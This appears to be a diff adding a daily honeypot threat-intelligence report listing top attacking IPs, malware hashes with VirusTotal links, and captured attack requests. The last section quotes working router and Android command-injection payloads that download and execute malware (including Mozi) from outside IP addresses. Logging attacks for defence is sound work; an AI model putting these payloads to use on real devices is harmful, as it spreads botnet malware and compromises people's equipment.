@@ -1,0 +1,37 @@
+Top 5 IPs for 2024-03-27 :
+
+170.64.218.113
+178.128.212.19
+42.178.168.243
+115.20.203.112
+112.187.221.129
+
+Malware Download:
+6215852026eb653b4323fe5578256d35a220fc8d0848b1800e5b5284ede21c16
+https://www.virustotal.com/gui/file/6215852026eb653b4323fe5578256d35a220fc8d0848b1800e5b5284ede21c16
+fe4950561d2a88a1643fcf94894c3f9e2ecffb3d1c3f5ae7763c3e819974e4de
+https://www.virustotal.com/gui/file/fe4950561d2a88a1643fcf94894c3f9e2ecffb3d1c3f5ae7763c3e819974e4de
+0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257
+https://www.virustotal.com/gui/file/0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257
+63946c28efa919809c03be75a3937c4be80589a9df79cd1be72037d493b70857
+https://www.virustotal.com/gui/file/63946c28efa919809c03be75a3937c4be80589a9df79cd1be72037d493b70857
+a1b6223a3ecb37b9f7e4a52909a08d9fd8f8f80aee46466127ea0f078c7f5437
+https://www.virustotal.com/gui/file/a1b6223a3ecb37b9f7e4a52909a08d9fd8f8f80aee46466127ea0f078c7f5437
+d7188b8c575367e10ea8b36ec7cca067ef6ce6d26ffa8c74b3faa0b14ebb8ff0
+https://www.virustotal.com/gui/file/d7188b8c575367e10ea8b36ec7cca067ef6ce6d26ffa8c74b3faa0b14ebb8ff0
+
+
+Malcious Commands seen:
+
+POST /goform/set_LimitClient_cfg HTTP/1.1
+Cookie: user=admin
+
+time1=00:00-00:00&time2=00:00-00:00&mac=;rm -rf *mpsl*;wget http://103.178.235.32/huhu.mpsl; chmod 777 huhu.mpsl; ./huhu.mpsl lblink.selfrep;rm -rf *mpsl*;
+
+
+cd /data/local/tmp/; busybox wget http://14.225.213.142/w.sh; sh w.sh; curl http://14.225.213.142/c.sh; sh c.sh; wget http://14.225.213.142/wget.sh; sh wget.sh; curl http://14.225.213.142/wget.sh; sh wget.sh; busybox wget http://14.225.213.142/wget.sh; sh wget.sh; busybox curl http://14.225.213.142/wget.sh; sh wget.sh
+
+cd /data/local/tmp/; busybox wget http://103.188.244.189/w.sh; sh w.sh; curl http://103.188.244.189/c.sh; sh c.sh; wget http://103.188.244.189/wget.sh; sh wget.sh; curl http://103.188.244.189/wget.sh; sh wget.sh; busybox wget http://103.188.244.189/wget.sh; sh wget.sh; busybox curl http://103.188.244.189/wget.sh; sh wget.sh
+
+/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://115.149.165.247:38679/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
+
